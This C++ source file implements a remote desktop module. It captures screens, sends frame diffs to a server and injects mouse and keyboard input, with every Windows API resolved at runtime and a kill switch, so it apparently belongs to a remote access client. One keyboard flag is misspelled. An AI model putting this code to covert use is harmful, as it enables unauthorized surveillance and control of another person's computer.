#include "cliente.hpp"
#include "mod_remote_desktop.hpp"
#include "misc.hpp"

extern Cliente* cCliente;
mod_RemoteDesktop* mod_Instance_RD = nullptr;

std::vector<Monitor> tmp_Monitores;

void Print_Mouse_Command(int x, int y, int monitor_index, int mouse_action) {
    std::cout << "X: " << x << "\nY:" << y << "Monitor: " << monitor_index << "\nAction: " << mouse_action << "\n";
}

int mod_RemoteDesktop::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    ImageCodecInfo* pImageCodecInfo = NULL;
    this->GDIPLUS.pGdipGetImageEncodersSize(&num, &size);
    if (size == 0) { return -1; } 

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) { return -1; }

	this->GDIPLUS.pGdipGetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;
}

bool mod_RemoteDesktop::m_isRunning() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    return this->isRunning;
}

void mod_RemoteDesktop::m_UpdateVmouse(bool isVisible) {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->isMouseOn = isVisible;
}

bool mod_RemoteDesktop::m_Vmouse() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->isMouseOn;
}

void mod_RemoteDesktop::m_RemoteMouse(int x, int y, int monitor_index, int mouse_action) {
    if(!this->USER32.pSendInput || !this->USER32.pSetCursorPos){
        __DBG_("[user32.dll] SendInput/SetCursorPos no cargado");
        return;
    }
    Print_Mouse_Command(x, y, monitor_index, mouse_action);
    Monitor monitor = this->m_GetMonitor(monitor_index);
    if (monitor.rectData.resWidth > 0) {
        this->USER32.pSetCursorPos(x, y);
        INPUT inputs[1] = {};
        ZeroMemory(inputs, sizeof(inputs));

        DWORD dwFlag = 0; //MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE;
        switch (mouse_action) {
            case EnumRemoteMouse::_LEFT_DOWN:
                dwFlag = MOUSEEVENTF_LEFTDOWN;
                break;
            case EnumRemoteMouse::_LEFT_UP:
                dwFlag = MOUSEEVENTF_LEFTUP;
                break;
            case EnumRemoteMouse::_RIGHT_DOWN:
                dwFlag = MOUSEEVENTF_RIGHTDOWN;
                break;
            case EnumRemoteMouse::_RIGHT_UP:
                dwFlag = MOUSEEVENTF_RIGHTUP;
                break;
            case EnumRemoteMouse::_MIDDLE_DOWN:
                dwFlag = MOUSEEVENTF_MIDDLEDOWN;
                break;
            case EnumRemoteMouse::_MIDDLE_UP:
                dwFlag = MOUSEEVENTF_MIDDLEUP;
                break;
            case EnumRemoteMouse::_WHEEL_DOWN:
            case EnumRemoteMouse::_WHEEL_UP:
                dwFlag = MOUSEEVENTF_WHEEL;
                break;
            default:
                break;
        }

        inputs[0].type = INPUT_MOUSE;
        inputs[0].mi.dwFlags = dwFlag;
        if (mouse_action == EnumRemoteMouse::_WHEEL_DOWN) {
            inputs[0].mi.mouseData = -120;
        }else if (mouse_action == EnumRemoteMouse::_WHEEL_UP) {
            inputs[0].mi.mouseData = 120;
        }
        this->USER32.pSendInput(1, inputs, sizeof(INPUT));
        /*
         
        Metodo 2
        int normalized_x = ((x - monitor.rectData.xStart) * 65535) / monitor.rectData.resWidth;
        int normalized_y = ((y - monitor.rectData.yStart) * 65535) / monitor.rectData.resHeight;

        INPUT inputs[1] = {};
        ZeroMemory(inputs, sizeof(inputs));

        inputs[0].type = INPUT_MOUSE;
        inputs[0].mi.dx = normalized_x;
        inputs[0].mi.dy = normalized_y;
        inputs[0].mi.dwFlags = MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
        */
        //UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
        //if (uSent != ARRAYSIZE(inputs)) {
        //   _DBG_("SendInput failed: 0x", HRESULT_FROM_WIN32(GetLastError()));
        //}
        
    }else {
        _DBG_("[X] El monitor seleccionado no existe", monitor_index);
    }
}

void mod_RemoteDesktop::m_RemoteTeclado(char key, bool isDown) {
    if (!this->USER32.pSendInput) {
        __DBG_("[user32.dll] SendInput no cargado");
        return;
    }
    INPUT inputs[1] = {};
    ZeroMemory(inputs, sizeof(inputs));

    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = key;
    inputs[0].ki.dwFlags = isDown ? KEYEVENTF_KEDOWN : KEYEVENTF_KEYUP;
    
    this->USER32.pSendInput(1, inputs, sizeof(INPUT));
}

//Obtiene los pixeles diferentes y los sobreescribe en _oldBitmap
int mod_RemoteDesktop::BitmapDiff(GpBitmap*& _oldBitmap, GpBitmap*& _newBitmap, std::vector<Pixel_Data>& _outPixels) {
    if (_newBitmap == nullptr || _oldBitmap == nullptr) {
        __DBG_("Uno de los bitmaps es nulo");
        if (_oldBitmap == nullptr) {
            __DBG_("Bitmap viejo es nulo (probabilidad de ser primera captura");
        }
        return -1;
    }

    if (!this->GDIPLUS.pGdipBitmapLockBits || !this->GDIPLUS.pGdipBitmapUnlockBits ||
        !this->GDIPLUS.pGdipGetImageWidth || !this->GDIPLUS.pGdipGetImageHeight) {
        __DBG_("[RD][X] BitmapDiff Funciones de GDI no cargadas");
        return -1;
    }

    UINT width = 0; 
    UINT height = 0;

    if(this->GDIPLUS.pGdipGetImageHeight((GpImage*)_oldBitmap, &height) != GpStatus::Ok ||
       this->GDIPLUS.pGdipGetImageWidth((GpImage*)_oldBitmap, &width) != GpStatus::Ok) {
        __DBG_("[RX][X] BitmapDiff Error al obtener dimensiones de _oldbitmap");
        return -1;
	}

    UINT n_width = 0;
    UINT n_height = 0;

    if (this->GDIPLUS.pGdipGetImageHeight((GpImage*)_newBitmap, &n_height) != GpStatus::Ok ||
        this->GDIPLUS.pGdipGetImageWidth((GpImage*)_newBitmap, &n_width) != GpStatus::Ok) {
        __DBG_("[RD][X] BitmapDiff Error al obtener dimensiones de _newBitmap");
        return -1;
    }

    if (width != n_width || height != n_height) {
        __DBG_("[RX][X] BitmapDiff Los bitmaps no son del mismo tamanio");
        return -1;
    }

    BitmapData bmpData1, bmpData2;
    GDIPCONST GpRect rect(0, 0, width, height);

    this->GDIPLUS.pGdipBitmapLockBits(_oldBitmap, &rect, ImageLockMode::ImageLockModeRead | ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData1);
    this->GDIPLUS.pGdipBitmapLockBits(_newBitmap, &rect, ImageLockMode::ImageLockModeRead | ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData2);

    BYTE* oldBitmapPixels = static_cast<BYTE*>(bmpData1.Scan0);
    BYTE* newBitmapPixels = static_cast<BYTE*>(bmpData2.Scan0);

    int outCantidad = 0;

    for (UINT y = 0; y < height; y++) {
        for (UINT x = 0; x < width; x++) {
            UINT index = y * bmpData1.Stride + x * 3; //3 bytes por pixel en formato RGB
            if (oldBitmapPixels[index    ] != newBitmapPixels[index    ] || //Canal Red
                oldBitmapPixels[index + 1] != newBitmapPixels[index + 1] || //Canal Green
                oldBitmapPixels[index + 2] != newBitmapPixels[index + 2]) { //Canal Blue
                
                //Pixel diferente
                outCantidad++;
                Pixel_Data nPixel;
                nPixel.x = x;
                nPixel.y = y;
                nPixel.data.R = newBitmapPixels[index    ];
                nPixel.data.G = newBitmapPixels[index + 1];
                nPixel.data.B = newBitmapPixels[index + 2];
                _outPixels.push_back(nPixel);

                //Sobreescribir pixeles en bitmap anterior
                oldBitmapPixels[index    ] = newBitmapPixels[index    ];
                oldBitmapPixels[index + 1] = newBitmapPixels[index + 1];
                oldBitmapPixels[index + 2] = newBitmapPixels[index + 2];

            }
        }
    }

    this->GDIPLUS.pGdipBitmapUnlockBits(_oldBitmap, &bmpData1);
    this->GDIPLUS.pGdipBitmapUnlockBits(_newBitmap, &bmpData2);

    return outCantidad;
}

void mod_RemoteDesktop::InitGDI() {
    if (this->GDIPLUS.pGdiplusStartup) {
       if (this->GDIPLUS.pGdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == GpStatus::Ok) {
            this->isGDIon = true;
        }
    }
}

void mod_RemoteDesktop::StopGDI() {
    if (this->GDIPLUS.pGdiplusShutdown) {
        this->GDIPLUS.pGdiplusShutdown(this->gdiplusToken);
    }
}

ULONG mod_RemoteDesktop::m_Quality() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->uQuality;
}

void mod_RemoteDesktop::m_UpdateQuality(int iNew) {
    //32 default
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->uQuality = iNew == 0 ? 32 : static_cast<ULONG>(iNew);
}

mod_RemoteDesktop::mod_RemoteDesktop(st_User32_RD& _user32, st_Gdi32& _gdi32, st_GdiPlus& _gdiplus, st_Ole32& _ole32, st_Kernel32& _kernel32) {
    this->USER32 = _user32;
    this->GDI32 = _gdi32;
    this->GDIPLUS = _gdiplus;
    this->OLE32 = _ole32;
    this->KERNEL32 = _kernel32;

    this->InitGDI();
    
    if (this->OLE32.pCoInitialize) {
        this->OLE32.pCoInitialize(NULL);
    }
    mod_Instance_RD = this;

    return;
}

mod_RemoteDesktop::~mod_RemoteDesktop() {
    this->StopGDI();
    if (this->OLE32.pCoUninitialize) {
        this->OLE32.pCoUninitialize();
    }
    return;
}

//NOTA: Bitmap debe ser liberado luego de usarse
GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
    GpBitmap* outBitmap = nullptr;

    if (!this->GDI32.pCreateCompatibleBitmap || !this->GDI32.pCreateCompatibleDC ||
        !this->GDI32.pSelectObject || !this->GDI32.pGetObjectA || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal ||
        !this->USER32.pGetWindowRect || !this->GDIPLUS.pGdipCreateBitmapFromHBITMAP ||
        !this->GDIPLUS.pGdipCreateBitmapFromStream ||
        !this->GDI32.pDeleteDC || !this->GDI32.pDeleteObject || !this->USER32.pGetDC || !this->USER32.pGetDesktopWindow || !this->KERNEL32.pGlobalAlloc) {
        __DBG_("[RD][X][getFrameBitmap]No se cargaron todas las funciones");
        return outBitmap;
    }

    Monitor monitor = this->m_GetMonitor(monitor_index);
    if (monitor.rectData.resHeight == 0) {
        __DBG_("[RD][X] El monitor no es valido o no se ha obtenido al lista");
        return outBitmap;
    }
    
    if (!this->isGDIon) {
        __DBG_("[RD][!] GDI no esta inicializado, init...");
        this->InitGDI();
        if (!this->isGDIon) {
            __DBG_("[RD][X] No se pudo iniciar...");
            return outBitmap;
        }
    }

    HDC hdcMonitor = this->USER32.pGetDC(NULL);
    HDC hdcMemDC = NULL;
    HWND hDesktopWnd = this->USER32.pGetDesktopWindow();
    HBITMAP hmpScreen = NULL; //Para leer toda la pantalla seleccionada 

    GpBitmap* bmpBitmap = nullptr;
    GpBitmap* jpgBitmap = nullptr;
    IStream* oStream = nullptr;
    HRESULT hr = S_OK;
    
    //Cursor
    CURSORINFO cursor = { sizeof(cursor) };
    ICONINFO info = { sizeof(info) };
    RECT cursorRect;
    int cursorX = 0;
    int cursorY = 0;
    BITMAP bmpCursor = { 0 };
    

    HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        error_2("[RD][X] getFrameBitmap GlobalAlloc error", hGlobalMem);
        goto EndSec;
    }

    if (!hdcMonitor) {
        __DBG_("[RD][X] getFrameBitmap GetDC failed");
        goto EndSec;
    }

    hdcMemDC = this->GDI32.pCreateCompatibleDC(hdcMonitor);
    if (!hdcMemDC) {
        __DBG_("[RD][X] getFrameBitmap pCreateCompatibleDC failed");
        goto EndSec;
    }

    hmpScreen = this->GDI32.pCreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
    if (!hmpScreen) {
        __DBG_("[RD][X] getFrameBitmap Createcompatiblebitmap failed");
        goto EndSec;
    }
    
    if (!this->GDI32.pSelectObject(hdcMemDC, hmpScreen)) {
        __DBG_("[RD][X] getFrameBitmap Select object failed");
        goto EndSec;
    }
    
    //Copiar los bits al bitmap   hmpScreen
    if (!this->GDI32.pBitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
        error_2("[RD][X] getFrameBitmap bitblt failed", -1);
        goto EndSec;
    }

    //Si esta habilitado mostrar el mouse capturar posicion y dibujar el puntero en el hdc   hdcMemDC
    if (this->m_Vmouse()) {
        if (this->USER32.pGetCursorInfo != nullptr &&
            this->USER32.pGetIconInfo != nullptr &&
            this->USER32.pDrawIconEx != nullptr) {
            
            this->USER32.pGetCursorInfo(&cursor);
            if (cursor.flags == CURSOR_SHOWING) {
                this->USER32.pGetWindowRect(hDesktopWnd, &cursorRect);
                this->USER32.pGetIconInfo(cursor.hCursor, &info);
                cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
                cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
                this->GDI32.pGetObjectA(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
                this->USER32.pDrawIconEx(hdcMemDC, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
            }
        }
    }

    hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        error_2("[RD][X] getFrameBitmap CreateStreamOnHGlobal error", hr);
        goto EndSec;
    }

    CLSID imageCLSID;
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = { 0x1d5be4b5,0xfa4a,0x452d,0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb };/*Gdiplus::EncoderQuality;*/
    encoderParams.Parameter[0].Type = EncoderParameterValueType::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    this->GetEncoderClsid(L"image/jpeg", &imageCLSID);
    
    //Crear el bitmap a partir del hbitmap capturado en hmpScreen
    if(this->GDIPLUS.pGdipCreateBitmapFromHBITMAP(hmpScreen, NULL, &bmpBitmap) != GpStatus::Ok || !bmpBitmap) {
        __DBG_("[RD][X] getFrameBitmap GdipCreateBitmapFromHBITMAP failed  or  bmpBitmap null");
        goto EndSec;
    }
    
    //Guardar el bitmap al stream  oStream  en formato jpeg
    if(this->GDIPLUS.pGdipSaveImageToStream(bmpBitmap, oStream, &imageCLSID, &encoderParams) != GpStatus::Ok){
    	__DBG_("[RD][X] getFrameBitmap No se pudo guardar el buffer al stream");
        goto EndSec;
    }

    //STATSTG stats = { 0 };
    //hr = oStream->Stat(&stats, STATFLAG_NONAME);
    //if (SUCCEEDED(hr)) {
    //    LARGE_INTEGER liZero = { 0 };
    //    ULARGE_INTEGER pos;
    //    pStream->Seek(liZero, STREAM_SEEK_CUR, &pos);
    //    wprintf(L"Stream size: %llu bytes, current pos: %llu\n", stats.cbSize.QuadPart, pos.QuadPart);
    //}
    oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

    //Crear otro bitmap, esta vez con formato jpeg
    GpStatus gpRet = this->GDIPLUS.pGdipCreateBitmapFromStream(oStream, &jpgBitmap);
    if (jpgBitmap != nullptr && gpRet == GpStatus::Ok) {
        outBitmap = jpgBitmap;
    }else {
        _DBG_("[RD][X] getFrameBitmap pGdipCreateBitmapFromStream error", gpRet);
    }

EndSec:
    if (oStream) {
        oStream->Release();
    }

    if (bmpBitmap) {
        this->GDIPLUS.pGdipDisposeImage((GpImage*)bmpBitmap);
    }

    if (hdcMonitor) {
        this->USER32.pReleaseDC(NULL, hdcMonitor);
    }

    if (hdcMemDC) {
        this->GDI32.pDeleteDC(hdcMemDC);
    }

    if (hmpScreen) {
        this->GDI32.pDeleteObject(hmpScreen);
    }

    return outBitmap;
}

std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quality) {
    std::vector<char> vcOut;
    IStream* oStream = nullptr;
    HRESULT hr = S_OK;
    STATSTG statstg;

    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        error_2("[RD][X] getBitmapBytes GlobalAlloc error", -1);
        goto EndSec;
    }

    hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        __DBG_("[RD][X] getBitmapBytes CreateStreamOnHGlobal error");
        goto EndSec;
    }

    CLSID imageCLSID;

    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = { 0x1d5be4b5,0xfa4a,0x452d,0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb };/*Gdiplus::EncoderQuality;*/
    encoderParams.Parameter[0].Type = EncoderParameterValueType::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &_quality;

    //Guardar imagen al stream oStream en formato jpeg
    this->GetEncoderClsid(L"image/jpeg", &imageCLSID);
	
    if (this->GDIPLUS.pGdipSaveImageToStream(_in, oStream, &imageCLSID, &encoderParams) != GpStatus::Ok) {
        __DBG_("[RD][X] getBitmapBytes pGdipSaveImageToStream error");
        goto EndSec;
    }

    //Leer todos lo bytes del stream
    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr == S_OK) {
        ULONG bytes_read = 0;
        ULONG uiBuffsize = statstg.cbSize.LowPart;
        vcOut.resize(uiBuffsize);
        if (vcOut.size() == uiBuffsize) {
            oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
            hr = oStream->Read(vcOut.data(), uiBuffsize, &bytes_read);
        }
    }else {
        __DBG_("[RD][X] getBitmapBytes oStream->Stat error");
    }

EndSec:
    if (oStream != nullptr) {
        oStream->Release();
    }
    return vcOut;
}

void mod_RemoteDesktop::pixelSerialize(const std::vector<Pixel_Data>& _vcin, std::vector<char>& _vcout) {
    size_t nsize = sizeof(Pixel_Data) * _vcin.size();
    _vcout.resize(nsize);
    if (_vcout.size() == nsize) {
        int iPos = 0;
        for (const Pixel_Data& pixel : _vcin) {
            memcpy(_vcout.data() + iPos, &pixel, sizeof(Pixel_Data));
            iPos += sizeof(Pixel_Data);
        }
    }else {
        __DBG_("No se pudo alojar memoria para el buffer de salida");
    }
}

void mod_RemoteDesktop::SpawnThread(ULONG quality, int monitor_index) {
    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality, monitor_index);
}

void mod_RemoteDesktop::DetenerLive() {
    __DBG_("[RD] Apagando...");
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    this->isRunning = false;
    lock.unlock();
    __DBG_("[RD] Joining thread...");
    if (this->th_RemoteDesktop.joinable()) {
        this->th_RemoteDesktop.join();
    }
    __DBG_("[RD] Done omar :v");
}

void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
    if (!this->GDIPLUS.pGdipGetImageHeight || !this->GDIPLUS.pGdipGetImageWidth ||
        !this->GDIPLUS.pGdipGetImagePixelFormat || !this->GDIPLUS.pGdipCloneBitmapAreaI ||
        !this->GDIPLUS.pGdipCreateBitmapFromScan0 || !this->GDIPLUS.pGdipDisposeImage) {
        __DBG_("[RD][IniciarLive] No estan cargas las funciones de gdiplus");
        return;
    }
    this->isRunning = true;
    this->m_UpdateQuality(quality);
    GpBitmap* oldBitmap = nullptr;
    while (this->m_isRunning()) {
        //Confirmar kill switch
        if (cCliente->isKillSwitch()) {
            __DBG_("[RD] kill_switch...");
            cCliente->setKillSwitch(false);
            this->DetenerLive();
            break;
        }

        //Obtener el bitmap del monitor con la calidad requerida
        GpBitmap* newBitmap = this->getFrameBitmap(this->m_Quality(), monitor_index);

        //Comprar pixeles para ver si hay diferencia
        std::vector<Pixel_Data> vcPixels;
        int iDiff = this->BitmapDiff(oldBitmap, newBitmap, vcPixels);

        if (iDiff == -1) {     //Hubo un error o probablemente es la primera captura de pantalla
            if (newBitmap != nullptr) {
                __DBG_("[RD][!]IniciarLive  Asignando newBitmap a oldBitmap");
                
                //Obtener dimensiones del nuevo bitmap
                UINT n_width = 0, n_height = 0;
                if (this->GDIPLUS.pGdipGetImageHeight(newBitmap, &n_height) != GpStatus::Ok ||
                    this->GDIPLUS.pGdipGetImageWidth(newBitmap, &n_width) != GpStatus::Ok) {
                    __DBG_("[RD][X] IniciarLive Error obteniendo dimenciones del nuevo bitmap");
                    this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
                    continue;
                }
                
                GpBitmap* copiaBitmap = nullptr;
                GpBitmap* pGpBitmap = nullptr;
                //Crear bitmap de n_width x n_height para copiar bytes del bitmap actual
                if (this->GDIPLUS.pGdipCreateBitmapFromScan0(n_width, n_height, 0, PixelFormat24bppRGB, nullptr, &pGpBitmap) == GpStatus::Ok && pGpBitmap) {
                    copiaBitmap = pGpBitmap;
                }else {
                    __DBG_("[RD][X] IniciarLive pGdipCreateBitmapFromScan0 error");
                    this->GDIPLUS.pGdipDisposeImage((GpBitmap*)newBitmap);
                    break;
                }

                //Obtener formato de pixeles del bitmap actual  newBitmap
                PixelFormat newPixelFormat = 0;
                
                if (this->GDIPLUS.pGdipGetImagePixelFormat(newBitmap, &newPixelFormat) == GpStatus::Ok) {
                    //Clonar bitmap a copiaBitmap y preservar la direccion de memoria en oldBitmap para futuras comparaciones
                    if (this->GDIPLUS.pGdipCloneBitmapAreaI(0, 0, n_width, n_height, newPixelFormat, newBitmap, &copiaBitmap) == GpStatus::Ok) {
                        oldBitmap = copiaBitmap;

                        //Obtener bytes del newBitmap
                        std::vector<char> imgBuffer = this->getBitmapBytes(newBitmap, this->m_Quality());
                        int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), static_cast<int>(imgBuffer.size()), 0, true, nullptr, EnumComandos::RD_Salida);
                        if (iSent == -1) {
                            __DBG_("[RD][X] IniciarLive error enviando el frame al servidor");
                            break;
                        }
                    }else {
                        __DBG_("[RD][X] IniciarLive pGdipCloneBitmapAreaI error");
                    }
                }else {
                    __DBG_("[RD][X] IniciarLive pGdipGetImagePixelFormat error");
                }

                //Liberar bitmaps
                if (pGpBitmap) {
                    this->GDIPLUS.pGdipDisposeImage((GpImage*)pGpBitmap);
                }
                this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
            }else {
                __DBG_("[RD][X] IniciarLive newBitmap es nulo");
            }
        }else if (iDiff > 0) { 
            //Hubo un cambio en la nueva captura, enviar diferencia
            if (newBitmap != nullptr) {
                this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
            }
            
            //oldBitmap aqui ya tiene los pixeles modificados
            //Vale la pena enviar el cambio de pixeles?
            if ((sizeof(Pixel_Data) * iDiff) < MAX_PIXELS) {
                //Serializar el vector a un std::vector<char> y mandarlo
                std::vector<char> vcData;
                this->pixelSerialize(vcPixels, vcData);
                int iSent = cCliente->cChunkSend(cCliente->sckSocket, vcData.data(), static_cast<int>(vcData.size()), 0, true, nullptr, EnumComandos::RD_Salida_Pixel);
                if (iSent == -1) {
                    __DBG_("[RD][X] IniciarLive cChunkSend(Pixels): Error enviando el paquete al servidor");
                    break;
                }
            }else {
                //La cantidad de bytes no vale la pena. Enviar el frame completo
                std::vector<char> imgBuffer = this->getBitmapBytes(oldBitmap, this->m_Quality());
                int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), static_cast<int>(imgBuffer.size()), 0, true, nullptr, EnumComandos::RD_Salida);
                if (iSent == -1) {
                    __DBG_("[RD][X] IniciarLive cChunkSend(Full frame): Error enviando el paquete al servidor");
                    break;
                }
            }
        }else {
            //No hubo cambios
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }

    if (oldBitmap != nullptr) {
        this->GDIPLUS.pGdipDisposeImage((GpBitmap*)oldBitmap);
    }    
}

void mod_RemoteDesktop::EnviarCaptura(ULONG quality, int monitor_index) {
    _DBG_("[RD][!] Enviando captura de pantalla. Index:", monitor_index);
    _DBG_("[RD][!] Calidad:", quality);
    
    GpBitmap* bitmapBits = this->getFrameBitmap(quality, monitor_index);
    if (bitmapBits != nullptr) {
        std::vector<char> vcDeskBuffer = this->getBitmapBytes(bitmapBits, quality);
        size_t iBufferSize = vcDeskBuffer.size();
        if (iBufferSize > 0) {
            int iRet = cCliente->cChunkSend(cCliente->sckSocket, vcDeskBuffer.data(), static_cast<int>(iBufferSize), 0, true, nullptr, EnumComandos::RD_Salida);
            if (iRet == -1) {
                __DBG_("[RD][X] EnviarCaptura No se puedo enviar la captura de pantalla");
            }else {
                __DBG_("[RD][X] EnviarCaptura Captura enviada");
            }
        }else {
            __DBG_("[RD][X] EnviarCaptura El buffer de remote_desk es 0");
        }
        this->GDIPLUS.pGdipDisposeImage((GpBitmap*)bitmapBits);
    }else {
        __DBG_("[RD][X] EnviarCaptura Error obteniendo el frame");
    }
}

std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
    this->m_Clear_Monitores();

    if (!this->USER32.pEnumDisplayMonitors) {
        __DBG_("[user32.dll] EnumDisplayMonitors no cargado");
        return this->m_GetVectorCopy();
    }
    
    this->USER32.pEnumDisplayMonitors(NULL, NULL, this->MonitorEnumProc, 0);
    
    for (Monitor monitor : tmp_Monitores) {
        this->m_Agregar_Monitor(monitor);
    }
    tmp_Monitores.clear();

    return this->m_GetVectorCopy();
}

BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT rectMonitor, LPARAM lparam) {
    if (!mod_Instance_RD->USER32.pGetMonitorInfoA) {
        return FALSE;
    }
    MONITORINFOEX info;
    Monitor new_Monitor;
    info.cbSize = sizeof(MONITORINFOEX);
    int width = rectMonitor->right - rectMonitor->left;
    int height = rectMonitor->bottom - rectMonitor->top;
    new_Monitor.rectData.resWidth = width;
    new_Monitor.rectData.resHeight = height;
    new_Monitor.rectData.xStart = rectMonitor->left;
    new_Monitor.rectData.yStart = rectMonitor->top;
    ZeroMemory(new_Monitor.szDevice, sizeof(new_Monitor.szDevice));
    if (mod_Instance_RD->USER32.pGetMonitorInfoA(hMonitor, &info)) {
        memcpy(new_Monitor.szDevice, info.szDevice, sizeof(new_Monitor.szDevice) - 1);
    }
    tmp_Monitores.push_back(new_Monitor);

    return TRUE;
}

void mod_RemoteDesktop::m_Agregar_Monitor(Monitor& new_monitor) {
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    this->vc_Monitores.push_back(new_monitor);
}

void mod_RemoteDesktop::m_Clear_Monitores(){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    this->vc_Monitores.clear();
}

Monitor mod_RemoteDesktop::m_GetMonitor(int index){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    if (index < this->vc_Monitores.size()) {
        return this->vc_Monitores[index];
    }
    Monitor dummy;
    return dummy;
}

std::vector<Monitor> mod_RemoteDesktop::m_GetVectorCopy(){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    return this->vc_Monitores;
}